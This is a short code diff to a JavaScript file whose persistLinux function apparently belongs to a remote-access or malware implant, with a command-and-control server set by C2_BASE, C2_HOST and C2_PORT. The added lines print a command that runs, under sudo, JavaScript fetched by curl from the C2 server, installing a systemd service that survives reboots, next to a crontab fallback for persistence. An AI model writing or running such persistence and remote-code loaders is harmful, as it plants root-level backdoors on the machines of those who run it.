@@ -126,6 +126,8 @@ function persistLinux(py) {
         }
     } else if (hasCmd('systemctl') && process.getuid && process.getuid() !== 0) {
         warn('Not root — skipping systemd, falling back to crontab');
+        warn('To install as a systemd service (survives reboots), run:');
+        console.log(`  sudo node -e "$(curl -s '${C2_BASE}/install.js?host=${C2_HOST}&port=${C2_PORT}')"`);
     }
     // Cron fallback (works without root)
     try {
